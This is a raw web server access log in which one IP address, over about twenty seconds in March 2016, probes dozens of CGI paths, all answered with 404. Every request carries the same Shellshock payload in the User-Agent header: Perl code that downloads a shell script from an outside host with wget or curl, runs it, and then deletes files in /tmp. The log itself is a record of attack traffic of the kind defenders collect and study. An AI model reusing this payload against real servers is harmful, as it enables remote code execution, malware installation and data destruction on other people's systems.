222.141.64.65 - - [29/Mar/2016:20:45:51 -0700] "GET /cgi-bin/php HTTP/1.1" 404 468 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:52 -0700] "GET /cgi-bin/php5 HTTP/1.1" 404 469 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:52 -0700] "GET /cgi-bin/php4 HTTP/1.1" 404 469 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:52 -0700] "GET /cgi-bin/php-cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:53 -0700] "GET /cgi-bin/php.cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:53 -0700] "GET /cgi-bin/firmwarecfg HTTP/1.1" 404 475 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:54 -0700] "GET /cgi-bin/%2f/admin.html HTTP/1.1" 404 473 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:54 -0700] "GET /cgi-bin/admin.html HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:55 -0700] "GET /cgi-bin/test-cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:55 -0700] "GET /sys-cgi HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:55 -0700] "GET /dana-na/auth/url_default/welcome.cgi HTTP/1.1" 404 486 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:56 -0700] "GET /cgi-bin/tree.php HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:56 -0700] "GET /cgi-bin/ICuGI/EST/blast_detail.cgi HTTP/1.1" 404 484 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:57 -0700] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 478 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:57 -0700] "GET /cgi-bin/w3mman2html.cgi HTTP/1.1" 404 476 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:58 -0700] "GET /cgi-bin/status/status.cgi HTTP/1.1" 404 474 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:58 -0700] "GET /phppath/php HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:58 -0700] "GET /main.cgi HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:59 -0700] "GET /info.cgi HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:45:59 -0700] "GET /index.cgi HTTP/1.1" 404 467 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:00 -0700] "GET /admin.cgi HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:00 -0700] "GET /administrator.cgi HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:01 -0700] "GET /cgi-bin/report.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:01 -0700] "GET /cgi-bin/webmap.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:01 -0700] "GET /cgi-bin/whois.cgi HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:02 -0700] "GET /cgi-sys/helpdesk.cgi HTTP/1.1" 404 473 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:02 -0700] "GET /cgi-bin/register.cgi HTTP/1.1" 404 473 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:03 -0700] "GET /cgi-bin/download.cgi HTTP/1.1" 404 473 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:03 -0700] "GET /cgi-bin/shop.cgi HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:04 -0700] "GET /cgi-sys/signup.cgi HTTP/1.1" 404 473 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:04 -0700] "GET /cgi-bin/profile.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:05 -0700] "GET /cgi-bin/about_us.cgi HTTP/1.1" 404 474 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:05 -0700] "GET /cgi-bin/php.fcgi HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:05 -0700] "GET /cgi-bin/calendar.cgi HTTP/1.1" 404 473 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:06 -0700] "GET /cgi-bin/download.cgi HTTP/1.1" 404 473 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:06 -0700] "GET /cgi-bin/light_board.cgi HTTP/1.1" 404 477 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:07 -0700] "GET /cgi-bin/main.cgi HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:07 -0700] "GET /cgi-bin/search.cgi HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:08 -0700] "GET /cgi-bin/test.cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:08 -0700] "GET /cgi-bin/file_up.cgi HTTP/1.1" 404 474 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:08 -0700] "GET /cgi-bin/concept.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:09 -0700] "GET /cgi-bin/query.cgi HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:09 -0700] "GET /cgi-bin/counter.cgi HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:10 -0700] "GET /cgi-bin/kontakt.cgi HTTP/1.1" 404 473 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:10 -0700] "GET /cgi-bin/backup.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:10 -0700] "GET /cgi-bin/firewall.cgi HTTP/1.1" 404 474 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:11 -0700] "GET /cgi-bin/index.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:11 -0700] "GET /cgi-bin/index2.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:12 -0700] "GET /cgi-bin/reboot.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:12 -0700] "GET /cgi-bin/printenv HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:13 -0700] "GET /cgi-bin/test-cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:13 -0700] "GET /cgi-bin/formmail.cgi HTTP/1.1" 404 474 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
